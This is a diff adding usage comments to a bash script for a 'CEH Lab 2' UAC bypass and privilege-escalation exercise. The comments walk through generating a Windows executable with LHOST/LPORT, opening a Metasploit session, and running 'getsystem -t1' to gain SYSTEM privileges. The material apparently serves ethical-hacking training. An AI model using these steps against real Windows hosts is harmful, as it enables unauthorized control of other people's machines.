@@ -4,6 +4,23 @@
 # CEH Lab 2: UAC Bypass & Privilege Escalation (Final Corrected Version)
 # ==============================================================================
 
+# lets see how to use it:)
+# sudo ./script.sh   ..provide then all inputs required lhost and lport local
+# it will run in that time go to windows and run the exe file there
+# then after session create run below command   sometimes  ENTER if it stops
+# resource escalate.rc
+# # then new session will created:
+# sessions -l to list all sessions:)
+# here suppose your session number that is new is 3 then execute below command:)
+# then initiate the session:)
+# sessions -i 3       ..3 because it is new created session:)
+# after that execute the below commands to escalate privilages:)
+# getuid  :current user check:
+# getsystem -t1     #escalate
+# getuid              #again check:)
+
+
+
 # 1. Root Check
 if [[ "$EUID" -ne 0 ]]; then 
     echo "[ERROR] Please run as root (sudo su)" >&2
